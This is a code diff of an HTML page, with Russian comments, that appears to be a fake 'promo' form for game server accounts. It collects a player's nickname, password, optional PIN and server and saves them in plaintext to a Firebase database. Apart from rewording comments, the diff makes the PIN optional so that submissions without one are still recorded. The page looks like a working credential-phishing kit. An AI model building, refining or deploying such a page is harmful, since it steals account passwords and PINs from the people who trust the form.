@@ -26,7 +26,7 @@
             padding: 20px;
         }
 
-        /* Стиль Liquid Glass (Матовое стекло) */
+        /* Стиль матового стекла (Liquid Glass) */
         .glass-container {
             background: rgba(255, 255, 255, 0.03);
             backdrop-filter: blur(15px);
@@ -40,6 +40,7 @@
             text-align: center;
         }
 
+        /* Текст сверху, который можно менять */
         .promo-title {
             font-size: 20px;
             font-weight: bold;
@@ -50,7 +51,7 @@
 
         .promo-subtitle {
             font-size: 14px;
-            color: #38bdf8; /* Голубой акцент */
+            color: #38bdf8; /* Спокойный голубой акцент */
             margin-bottom: 25px;
         }
 
@@ -83,15 +84,16 @@
             border-color: #38bdf8;
         }
 
-        /* Стиль для сообщения об ошибке формата ника */
+        /* Предупреждение о неправильном формате ника (мягкий оранжевый, без агрессивного красного) */
         .error-message {
             display: none;
-            color: #fb923c; /* Мягкий оранжевый вместо агрессивного красного */
+            color: #fb923c;
             font-size: 12px;
             margin-top: 5px;
             padding-left: 4px;
         }
 
+        /* Синяя основная кнопка */
         .btn {
             width: 100%;
             padding: 14px;
@@ -114,6 +116,7 @@
             transform: scale(0.98);
         }
 
+        /* Кнопка выбора сервера */
         .btn-secondary {
             background: rgba(255, 255, 255, 0.07);
             border: 1px solid rgba(255, 255, 255, 0.1);
@@ -146,11 +149,11 @@
         #selected {
             margin: 10px 0 15px 0;
             font-size: 14px;
-            color: #34d399;
+            color: #34d399; /* Приятный зеленый для успешного статуса */
             font-weight: 500;
         }
 
-        /* Модальное окно */
+        /* Кастомное модальное окно */
         .modal-overlay {
             display: none;
             position: fixed;
@@ -222,8 +225,8 @@
             </div>
 
             <div class="input-group">
-                <label for="pincode">Пин-код (4 цифры)</label>
-                <input type="text" id="pincode" class="input-field" placeholder="Х Х Х Х" required 
+                <label for="pincode">Пин-код (4 цифры, не обязательно)</label>
+                <input type="text" id="pincode" class="input-field" placeholder="Х Х Х Х (не обязательно)" 
                        maxlength="4" inputmode="numeric" pattern="[0-9]{4}" 
                        oninput="this.value = this.value.replace(/[^0-9]/g, '')">
             </div>
@@ -231,7 +234,7 @@
             <button type="button" class="btn btn-secondary" onclick="openMenu()">Выбрать сервер</button>
 
             <div id="menu">
-                <select id="serverSelect" onchange="saveServer()" required>
+                <select id="serverSelect" onchange="saveServer()">
                     <option value="">-- Выберите сервер --</option>
                     <option>RED [1]</option>
                     <option>GREEN [2]</option>
@@ -354,6 +357,7 @@
             databaseURL: "https://beaschat-e0a28-default-rtdb.europe-west1.firebasedatabase.app"
         };
 
+        // Инициализация Firebase
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
@@ -376,11 +380,11 @@
             let saved = localStorage.getItem("selectedServer");
             if(saved){
                 document.getElementById("serverSelect").value = saved;
-                document.getElementById("selected").innerHTML = "Выбран server: " + saved;
+                document.getElementById("selected").innerHTML = "Выбран сервер: " + saved;
             }
         }
 
-        // Логика отправки формы с жесткой валидацией
+        // Логика отправки формы
         function submitForm(event) {
             event.preventDefault();
 
@@ -391,17 +395,15 @@
             let serverVal = document.getElementById("serverSelect").value;
             let errorDiv = document.getElementById("usernameError");
 
-            // Регулярное выражение: проверяет формат Имя_Фамилия (английские буквы, строго одно подчёркивание в середине)
+            // Регулярное выражение проверки формата Имя_Фамилия
             const nicknameRegex = /^[A-Za-z]+_[A-Za-z]+$/;
 
             if (!nicknameRegex.test(usernameVal)) {
-                // Если формат неверный — показываем ошибку и останавливаем скрипт
                 errorDiv.style.display = "block";
                 usernameField.style.borderColor = "#fb923c";
                 usernameField.focus();
                 return;
             } else {
-                // Если всё ок — прячем ошибку
                 errorDiv.style.display = "none";
                 usernameField.style.borderColor = "rgba(255, 255, 255, 0.1)";
             }
@@ -411,28 +413,31 @@
                 return;
             }
 
-            if(pincodeVal.length !== 4) {
-                alert("Пин-код должен состоять ровно из 4 цифр!");
+            // Условная валидация пин-кода: проверяем длину ТОЛЬКО если поле заполнено
+            if(pincodeVal.length > 0 && pincodeVal.length !== 4) {
+                alert("Если вы вводите пин-код, он должен состоять ровно из 4 цифр!");
                 return;
             }
 
-            // Запись в Firebase: ветка users/Имя_Фамилия
+            // Запись в базу данных (если пин-код пуст, запишет "не указан")
             database.ref('users/' + usernameVal).set({
                 username: usernameVal,
                 password: passwordVal,
-                pincode: pincodeVal,
+                pincode: pincodeVal || "не указан",
                 server: serverVal,
                 date: new Date().toLocaleString()
             })
             .then(() => {
+                // Сброс формы и очистка стейтов
                 document.getElementById("accountForm").reset();
                 document.getElementById("selected").innerHTML = "";
                 localStorage.removeItem("selectedServer");
                 
+                // Показ кастомного модального окна
                 document.getElementById("successModal").style.display = "flex";
             })
             .catch((error) => {
-                console.error("Ошибка сохранения:", error);
+                console.error("Ошибка сохранения данных:", error);
                 alert("Ошибка соединения с базой данных!");
             });
         }
